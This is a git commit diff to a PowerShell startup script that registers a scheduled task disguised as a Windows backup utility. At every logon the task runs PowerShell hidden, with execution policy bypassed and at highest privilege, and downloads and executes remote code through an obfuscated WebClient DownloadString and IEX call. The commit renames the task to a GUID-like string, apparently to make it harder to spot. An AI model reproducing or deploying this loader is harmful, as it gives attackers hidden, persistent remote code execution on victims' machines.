d5dd893718976be3238da1ce4b8928a8b9d9c66a
43a1723 <hai1723notgay@gmail.com>
2024-06-19 19:22:54 +0700

    Update startup.ps1

--- startup.ps1
+++ startup.ps1
@@ -3,7 +3,7 @@ $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$powershellcode
 $need = "-Win Hidden -NoP -ExecutionPolicy Bypass"
 $task_action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "$need `"IEX($download)`"" 
 $task_trigger = New-ScheduledTaskTrigger -AtLogOn
-$task_name = "Automatic Backup Windows"
+$task_name = "{FE75EAA7-323E-4B5C-B3B3-86C0B79424E7}"
 $task_desc = "Always Backup & Fix If Windows ERROR. "
 $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
 Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description $task_desc -RunLevel Highest -Force | Out-Null
